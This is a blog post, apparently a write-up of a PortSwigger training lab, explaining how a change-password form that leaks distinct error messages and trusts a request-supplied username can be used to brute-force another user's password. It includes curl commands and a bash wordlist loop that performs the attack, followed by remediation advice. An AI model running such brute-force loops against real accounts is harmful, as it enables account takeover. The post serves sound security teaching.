---
layout: post
title: "PortSwigger: Password brute-force via password change"
date: 2027-11-08 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, Authentication]
tags: [portswigger, authentication, brute-force, password-change, oracle, cwe-307, cwe-287]
---

A login form is the obvious place to brute-force a password — so it's the obvious place to defend. But the *change-password* form tests passwords too, and on this lab nobody put a lock on that door. Worse, the form leaks a clean yes/no answer about whether your guess was right, and it will happily test guesses against **any** account, not just your own. The result is a full brute-force of a victim's password from your own logged-in session. This is [CWE-307](https://cwe.mitre.org/data/definitions/307.html) (no restriction on repeated authentication attempts) compounded by [CWE-287](https://cwe.mitre.org/data/definitions/287.html) (the response distinguishes a correct password from a wrong one).

## Overview

The change-password form posts four fields:

```
username, current-password, new-password-1, new-password-2
```

Two design mistakes turn it into a password oracle:

1. **The server verifies `current-password` before it checks that the two new passwords match**, and returns a *different* error for each failure:
   - Wrong current password → `Current password is incorrect`
   - Correct current password, mismatched new passwords → `New passwords do not match`
2. **`username` is a hidden field you control.** The endpoint trusts it rather than deriving the account from your session, so you can aim the form at someone else.

Send two *different* new passwords every time and the error message becomes a boolean: did the `current-password` I guessed match? Nothing rate-limits the endpoint, so you can ask that question thousands of times.

## Proving the oracle

Log in as your own account (`wiener:peter`) to get a session cookie, then send the two failing cases and watch the messages differ:

```bash
# wrong current password + mismatched new passwords
curl -sk -b cookies.txt "https://LAB/my-account/change-password" \
  --data-urlencode "username=carlos" --data-urlencode "current-password=wrongpw" \
  --data-urlencode "new-password-1=aaa" --data-urlencode "new-password-2=bbb"
# -> "Current password is incorrect"

# correct current password + mismatched new passwords
curl -sk -b cookies.txt "https://LAB/my-account/change-password" \
  --data-urlencode "username=wiener" --data-urlencode "current-password=peter" \
  --data-urlencode "new-password-1=aaa" --data-urlencode "new-password-2=bbb"
# -> "New passwords do not match"
```

Two distinct responses for the same "failed" request — that's the leak.

## Brute-forcing carlos

Keep the new passwords mismatched, set `username=carlos`, and loop the candidate wordlist. The guess that flips the error to `New passwords do not match` is the winner:

```bash
while read pw; do
  curl -sk -b cookies.txt "https://LAB/my-account/change-password" \
    --data-urlencode "username=carlos" \
    --data-urlencode "current-password=$pw" \
    --data-urlencode "new-password-1=aaa" \
    --data-urlencode "new-password-2=bbb" \
  | grep -q "New passwords do not match" && echo "[+] FOUND: $pw" && break
done < passwords.txt
# [+] FOUND: thunder
```

Logging in as `carlos:thunder` and opening **My account** flips the lab to **Solved**.

## Why it worked

The confirmation check runs *after* the current-password check, so a deliberate mismatch in the new passwords isolates a single fact — "was the current password right?" — into the response. With no attempt limit and an attacker-controlled `username`, that fact can be harvested for every candidate password against any user.

## The fix

- Compare the two new passwords **before** verifying the current password, or return one generic error for any failure so the two cases are indistinguishable.
- Rate-limit and lock out repeated failures on the change-password endpoint, exactly as you would on login.
- Take the target account from the authenticated session — never from a `username` field in the request body.
